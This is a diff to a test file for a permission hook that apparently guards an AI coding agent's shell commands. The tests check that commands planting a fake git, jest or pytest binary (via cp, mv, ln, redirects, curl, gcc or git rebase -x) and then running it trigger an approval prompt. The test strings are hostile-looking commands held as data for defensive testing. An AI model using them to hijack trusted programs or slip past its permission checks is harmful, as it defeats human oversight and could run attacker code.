@@ -5788,10 +5788,9 @@ describe("PreToolUse hook - git is not trusted beside a hook or a configuration 
     "cd src && eval \"$X\" && git commit -m security",
     "printf 'rm -rf \"../$1\"\\n' > src/e.sh; cd src && sh e.sh security",
     "printf 'rm -rf \"../$1\"\\n' > src/e.sh; chmod +x src/e.sh; cd src && ./e.sh security",
-    // A cost of H6, measured again here: a glob in a stage that writes
-    // can expand to a file named git, also where it is only read. The
-    // cost ruling on write positions takes it up.
-    "cp src/* dist/ && git commit -m \"security fix\"",
+    // (`cp src/* dist/ && git commit -m "security fix"` stood here as a
+    // cost of H6. It is silent since the cost ruling on write places,
+    // and is tested in that group.)
   ]) {
     stagedOnly(`asks: ${command}`, () => {
       const out = runGuarded(command);
@@ -6693,6 +6692,108 @@ describe("PreToolUse hook - git's store names a file again to what comes after (
 
   stagedOnly("silent, PowerShell tool: an append, git add, git commit", () => {
     expectSilent(runGuarded("echo \"## Security\" >> README.md; git add README.md; git commit -m docs", { mode: "bypassPermissions", tool: "PowerShell" }));
+  });
+});
+
+// ---------------------------------------------------------------------------
+// RE-PROBE 8, THE COST RULING ON H6 (staged): a program's name anywhere in
+// another stage that writes counted as a file planted under that name, so
+// `python manage.py migrate && python manage.py test security` and `git
+// checkout -b fix/npm && npm run security` asked. The name counts only
+// where something is written: a redirect target, the last word of cp, mv
+// or ln and the name each source lands under, and every word of a program
+// whose write places the reader does not know.
+
+describe("PreToolUse hook - a program's name counts as planted only where something is written (re-probe 8, cost ruling on H6)", () => {
+  for (const command of [
+    // The ruling's cases.
+    "python manage.py migrate && python manage.py test security",
+    "git checkout -b fix/npm && npm run security",
+    "cp src/* dist/ && git commit -m \"security fix\"",
+    "cp -r src/* dist/ && npm run security",
+    // A script an interpreter is given first, and a branch.
+    "python manage.py makemigrations && python manage.py migrate && python manage.py test security",
+    "git switch -c fix/pytest && pytest -k security",
+    "git branch chore/git && git commit -m security",
+    "git checkout -b fix/npm origin/main && npm run security",
+    // A copy's source is read: only the name it lands under counts.
+    "cp docs/npm/readme.md docs/ && npm run security",
+    "cp notes/* ~/bin/ && git commit -m security",
+    // A reader with a redirect: its operands are read.
+    "grep -rn jest src > out.txt; npx jest security",
+    "cat docs/git > out.txt && git commit -m security",
+    // rm writes no file.
+    "rm -rf dist/* && npm run security",
+    "rm -rf dist && mkdir dist && cp -r src/* dist/ && git commit -m \"security fix\"",
+  ]) {
+    stagedOnly(`silent: ${command}`, () => {
+      expectSilent(runGuarded(command, { mode: "bypassPermissions" }));
+    });
+  }
+
+  for (const command of [
+    // The last word of a copy, a move or a link.
+    "cp evil ~/bin/git; git commit -m security",
+    "mv x ~/bin/gi[t]; git commit -m security",
+    "ln -s ../evil.sh ~/bin/git; git commit -m security",
+    "cp evil ~/bin/gi$U\"t\"; git commit -m security",
+    // A source lands in a folder under its own name.
+    "cp evil/git ~/bin/; git commit -m security",
+    "cp tools/git tools/jest ~/bin; git commit -m security",
+    "cp evil/GIT.exe ~/bin/; git commit -m security",
+    "cp evil/{git,x} ~/bin/; git commit -m security",
+    "cp tools/pytest.py .; python -m pytest security",
+    "mv build/jest node_modules/.bin/; npx jest security",
+    "ln -sf ../../evil/jest node_modules/.bin/; npx jest security",
+    "for f in git; do cp evil/$f ~/bin/; done; git commit -m security",
+    // A glob whose folder holds the file, or cannot be listed.
+    "printf 'x' > t/git && cp t/* ~/bin/ && git commit -m security",
+    "cp $SRC/* ~/bin/; git commit -m security",
+    "cp */git ~/bin/; git commit -m security",
+    // An option that names a file, or a wrapper: every word counts.
+    "cp -t ~/bin evil/git; git commit -m security",
+    "cp --target-directory=~/bin evil/git; git commit -m security",
+    "cp -- evil/git ~/bin/; git commit -m security",
+    "install -m 755 evil ~/bin/git; git commit -m security",
+    "sudo cp evil/git ~/bin/; git commit -m security",
+    // A redirect target, and the files of tee and dd.
+    "cat evil > ~/bin/git; git commit -m security",
+    "sort names/git > ~/bin/git; git commit -m security",
+    "echo x | tee ~/bin/git; git commit -m security",
+    "dd if=evil of=~/bin/git; git commit -m security",
+    // What echo says can be a script the redirect writes.
+    "echo 'cp evil ~/bin/git' > Makefile; make; git commit -m security",
+    // A program whose write places the reader does not know.
+    "gcc -o ~/bin/git evil.c; git commit -m security",
+    "node gen.js ~/bin/git; git commit -m security",
+    "bash build.sh ~/bin/git; git commit -m security",
+    "sh -c 'cp evil ~/bin/git'; git commit -m security",
+    "curl -O https://example.test/git; git commit -m security",
+    // git with a path, a command string, or no branch made.
+    "git checkout -b x -- bin/git; git commit -m security",
+    "git checkout HEAD~1 -- bin/git; git commit -m security",
+    "git mv x bin/git; git commit -m security",
+    "git rebase -x 'cp evil ~/bin/git' HEAD~1; git commit -m security",
+    "git switch -c x 'a; cp evil ~/bin/git'; git commit -m security",
+    // The cost that stays: an option in front of the script.
+    "python -u manage.py migrate && python manage.py test security",
+  ]) {
+    stagedOnly(`asks: ${command}`, () => {
+      const out = runGuarded(command);
+      assert.equal(decisionOf(out), "ask", `${command} -> ${out.slice(0, 200) || "(silent)"}`);
+    });
+  }
+
+  // A glob is judged by what the folder holds when the command is read.
+  stagedOnly("asks: cp tools/* ~/bin/ when tools holds a file named git", () => {
+    const out = withTempProject((dir) => {
+      const root = guardedProject(dir);
+      mkdirSync(path.join(root, "tools"), { recursive: true });
+      writeFileSync(path.join(root, "tools", "git"), "x\n");
+      return runHook(PRE_HOOK, { tool_name: "Bash", cwd: root, tool_input: { command: "cp tools/* ~/bin/ && git commit -m security" } },
+        { CLAUDE_PROJECT_DIR: root });
+    });
+    assert.equal(decisionOf(out), "ask", out.slice(0, 200) || "(silent)");
   });
 });
 
